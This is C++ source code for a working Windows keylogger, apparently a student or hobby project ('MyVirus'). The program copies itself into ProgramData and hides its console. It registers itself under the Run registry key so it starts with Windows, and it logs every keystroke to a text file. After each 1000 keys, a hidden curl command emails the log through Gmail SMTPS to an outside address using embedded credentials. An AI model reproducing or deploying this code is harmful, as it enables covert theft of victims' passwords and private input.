// Keylogger_cPP.cpp : Этот файл содержит функцию "main". Здесь начинается и заканчивается выполнение программы.
//

#include "pch.h"

#include <iostream>
#include <windows.h>
#include<winuser.h>
#include <locale>
#include<stdio.h>
#define _CRT_SECURE_NO_WARNINGS



using namespace std;


int SaveLogs(int key_stroke, const char *file); 
void Stealth();
BOOL RegisterMyProgramForStartup(PCWSTR pszAppName, PCWSTR pathToExe, PCWSTR args);
BOOL IsMyProgramRegisteredForStartup(PCWSTR pszAppName);
void RegisterProgram();

int main() 
{
	wchar_t szPathToExe[MAX_PATH];
	GetModuleFileNameW(NULL, szPathToExe, MAX_PATH);
	FILE *f1 = _wfopen(szPathToExe, L"rb");
	wchar_t second_path[MAX_PATH] = L"C:\\ProgramData\\sample.exe";
	FILE *f2 = _wfopen(second_path, L"wb");
	fseek(f1, 0, SEEK_END);
	int file_size = ftell(f1);
	rewind(f1);
	
	char *buffer = (char*)malloc(file_size);
	
	fread(buffer, 1, file_size, f1);
	if (f2 != nullptr)
	{
		fwrite(buffer, 1, file_size, f2);
		fclose(f2);
	}
	Stealth();
	FILE* f = _wfopen(L"C:\\ProgramData\\MYLOGS.txt", L"w");
	if (f != nullptr)
		fclose(f);
	if (!IsMyProgramRegisteredForStartup(L"MyVirus"))
	{
		RegisterProgram();
	}
	int k = 0;
	while (true)
	{
		for(int i = 8; i <= 190; i++)
		{
			if (GetAsyncKeyState(i) == -32767)
			{
				k++;
				SaveLogs(i, "C:\\ProgramData\\MYLOGS.txt");
				if (k == 1000)
				{
					auto command = "curl --url \"smtps://smtp.gmail.com:465\" --ssl -reqd --mail-from \"simple1keylogger1for1project@gmail.com\" --mail-rcpt \"lenavasi78@mail.ru\" --upload-file \"C:\\ProgramData\\MYLOGS.TXT\" --user \"simple1keylogger1for1project@gmail.com:ABCD_1234\" --insecure";
					WinExec(command, SW_HIDE);
					Sleep(10000);
					FILE* f = _wfopen(L"C:\\ProgramData\\MYLOGS.txt", L"w");
					if (f != nullptr)
						fclose(f);
					k = 0;
					
				}
			}
			if (i % 150 == 0)
			{
				Sleep(1);
			}
		}
	}
	return 0;
}

int SaveLogs(int key_stroke, const char *file)
{
	if ((key_stroke == 1) || (key_stroke == 2))
		return 0; 
	FILE *OUTPUT_FILE;
	cout << key_stroke << endl;
	OUTPUT_FILE = fopen(file, "a+");
	if (key_stroke == 8)
		fprintf(OUTPUT_FILE, "%s", "[BACKSPACE]");
	else if (key_stroke == 13)
		fprintf(OUTPUT_FILE, "%s", "\n");
	else if (key_stroke == 32)
		fprintf(OUTPUT_FILE, "%s", " ");
	else if (key_stroke == VK_TAB)
		fprintf(OUTPUT_FILE, "%s", "[TAB]");
	else if (key_stroke == VK_SHIFT)
		fprintf(OUTPUT_FILE, "%s", "[SHIFT]");
	else if (key_stroke == VK_CONTROL)
		fprintf(OUTPUT_FILE, "%s", "[CONTROL]");
	else if (key_stroke == VK_ESCAPE)
		fprintf(OUTPUT_FILE, "%s", "[ESCAPE]");
	else if (key_stroke == VK_END)
		fprintf(OUTPUT_FILE, "%s", "[END]");
	else if (key_stroke == VK_HOME)
		fprintf(OUTPUT_FILE, "%s", "[HOME]");
	else if (key_stroke == VK_LEFT)
		fprintf(OUTPUT_FILE, "%s", "[LEFT]");
	else if (key_stroke == VK_UP)
		fprintf(OUTPUT_FILE, "%s", "[UP]");
	else if (key_stroke == VK_RIGHT)
		fprintf(OUTPUT_FILE, "%s", "[RIGHT]");
	else if (key_stroke == VK_DOWN)
		fprintf(OUTPUT_FILE, "%s", "[DOWN]");
	else if (key_stroke == 190 || key_stroke == 110)
		fprintf(OUTPUT_FILE, "%s", ".");
	else if (key_stroke == VK_CAPITAL)
		fprintf(OUTPUT_FILE, "%s", "[CAPS LOCK]");
	else
	{
		if (key_stroke >= 48 && key_stroke <= 57)
		{
			if (((GetKeyState(VK_SHIFT) & 0X0001) != 0))
			{
				switch (key_stroke)
				{
				case 48:
					fprintf(OUTPUT_FILE, "%s", ")");
					break;
				case 49:
					fprintf(OUTPUT_FILE, "%s", "!");
					break;
				case 50:
					fprintf(OUTPUT_FILE, "%s", "@");
					break;
				case 51:
					fprintf(OUTPUT_FILE, "%s", "#");
					break;
				case 52:
					fprintf(OUTPUT_FILE, "%s", "$");
					break;
				case 53:
					fprintf(OUTPUT_FILE, "%s", "%");
					break;
				case 54:
					fprintf(OUTPUT_FILE, "%s", "^");
					break;
				case 55:
					fprintf(OUTPUT_FILE, "%s", "&");
					break;
				case 56:
					fprintf(OUTPUT_FILE, "%s", "*");
					break;
				case 57:
					fprintf(OUTPUT_FILE, "%s", "(");
					break;
				}
			}
			else
			{
				fprintf(OUTPUT_FILE, "%s", &key_stroke);
			}
		}
		else
		{
			switch (key_stroke)
			{
			case 187:
				if ((GetKeyState(VK_SHIFT) & 0X0001) != 0)
					fprintf(OUTPUT_FILE, "%s", "+");
				else
					fprintf(OUTPUT_FILE, "%s", "=");
				break;
			case 189:
				if ((GetKeyState(VK_SHIFT) & 0X0001) != 0)
					fprintf(OUTPUT_FILE, "%s", "_");
				else
					fprintf(OUTPUT_FILE, "%s", "-");
				break;
			case 106:
				if ((GetKeyState(VK_SHIFT) & 0X0001) != 0)
					fprintf(OUTPUT_FILE, "%s", "*");
				else
					fprintf(OUTPUT_FILE, "%s", "*");
				break;
			case 111:
				if ((GetKeyState(VK_SHIFT) & 0X0001) != 0)
					fprintf(OUTPUT_FILE, "%s", "/");
				else
					fprintf(OUTPUT_FILE, "%s", "/");
				break;
			case 107:
				if ((GetKeyState(VK_SHIFT) & 0X0001) != 0)
					fprintf(OUTPUT_FILE, "%s", "+");
				else
					fprintf(OUTPUT_FILE, "%s", "+");
				break;
			case 109:
				if ((GetKeyState(VK_SHIFT) & 0X0001) != 0)
					fprintf(OUTPUT_FILE, "%s", "-");
				else
					fprintf(OUTPUT_FILE, "%s", "-");
				break;
			case 190:
				if ((GetKeyState(VK_SHIFT) & 0X0001) != 0)
					fprintf(OUTPUT_FILE, "%s", ">");
				else
					fprintf(OUTPUT_FILE, "%s", ".");
				break;
			case 188:
				if ((GetKeyState(VK_SHIFT) & 0X0001) != 0)
					fprintf(OUTPUT_FILE, "%s", "<");
				else
					fprintf(OUTPUT_FILE, "%s", ",");
				break;
			case 186:
				if ((GetKeyState(VK_SHIFT) & 0X0001) != 0)
					fprintf(OUTPUT_FILE, "%s", ":");
				else
					fprintf(OUTPUT_FILE, "%s", ";");
				break;
			default:
				if (((GetKeyState(VK_CAPITAL) & 0x0001) != 0) || ((GetKeyState(VK_SHIFT) &0X0001) != 0))
				{
					fprintf(OUTPUT_FILE, "%s", &key_stroke);
				}
				else
				{
					key_stroke += 32;
					fprintf(OUTPUT_FILE, "%s", &key_stroke);
				}
				break;
			}
		}
		
	}
	fclose(OUTPUT_FILE); 
	return 0;
}

void Stealth() 
{ 
	HWND stealth; 
	AllocConsole(); 
	stealth = FindWindowA("ConsoleWindowClass", NULL); 
	ShowWindow(stealth, 0); 
}


BOOL IsMyProgramRegisteredForStartup(PCWSTR pszAppName)
{
	HKEY hKey = NULL;
	LONG lResult = 0;
	BOOL fSuccess = TRUE;
	DWORD dwRegType = REG_SZ;
	wchar_t szPathToExe[MAX_PATH] = {};
	DWORD dwSize = sizeof(szPathToExe);

	lResult = RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_READ, &hKey);

	fSuccess = (lResult == 0);

	if (fSuccess)
	{
		lResult = RegGetValueW(hKey, NULL, pszAppName, RRF_RT_REG_SZ, &dwRegType, szPathToExe, &dwSize);
		fSuccess = (lResult == 0);
	}

	if (fSuccess)
	{
		fSuccess = (wcslen(szPathToExe) > 0) ? TRUE : FALSE;
	}

	if (hKey != NULL)
	{
		RegCloseKey(hKey);
		hKey = NULL;
	}

	return fSuccess;
}

BOOL RegisterMyProgramForStartup(PCWSTR pszAppName, PCWSTR pathToExe, PCWSTR args)
{
	HKEY hKey = NULL;
	LONG lResult = 0;
	BOOL fSuccess = TRUE;
	DWORD dwSize;

	const size_t count = MAX_PATH * 2;
	wchar_t szValue[count] = {};
	wcscpy_s(szValue, count, L"\"");
	wcscat_s(szValue, count, pathToExe);
	wcscat_s(szValue, count, L"\" ");

	if (args != NULL)
	{
		wcscat_s(szValue, count, args);
	}

	lResult = RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, 0, (KEY_WRITE | KEY_READ), NULL, &hKey, NULL);

	fSuccess = (lResult == 0);

	if (fSuccess)
	{
		dwSize = (wcslen(szValue) + 1) * 2;
		lResult = RegSetValueExW(hKey, pszAppName, 0, REG_SZ, (BYTE*)szValue, dwSize);
		fSuccess = (lResult == 0);
	}

	if (hKey != NULL)
	{
		RegCloseKey(hKey);
		hKey = NULL;
	}

	return fSuccess;
}

void RegisterProgram()
{
	wchar_t szPathToExe[MAX_PATH] = L"C:\\ProgramData\\sample.exe";

	RegisterMyProgramForStartup(L"MyVirus", szPathToExe, L"-foobar");
}
